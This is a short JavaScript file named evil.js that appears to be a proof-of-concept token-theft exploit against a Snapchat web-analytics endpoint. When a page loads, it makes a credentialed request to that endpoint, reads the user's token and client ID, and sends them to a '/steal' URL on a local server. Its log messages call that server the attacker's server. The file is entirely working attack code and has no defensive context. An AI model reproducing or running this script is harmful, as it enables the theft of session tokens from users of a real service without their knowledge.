// evil.js
document.addEventListener('DOMContentLoaded', function() {
    fetch('https://us-central1-gcp.api.snapchat.com/web-analytics/web/init_client', {
        method: 'POST',
        credentials: 'include'
    })
    .then(response => response.json())
    .then(data => {
        const token = data.token;
        const cid = data.cid;
        
        // ارسل إلى الخادم المحلي على port 8000
        fetch('http://localhost:8000/steal?token=' + token + '&cid=' + cid, {
            method: 'GET',
            mode: 'no-cors'
        })
        .then(() => {
            console.log('Token stolen successfully: ' + token);
        })
        .catch(error => {
            console.error('Error sending token to attacker server:', error);
        });
    })
    .catch(error => {
        console.error('Error fetching token from Snapchat API:', error);
    });
});
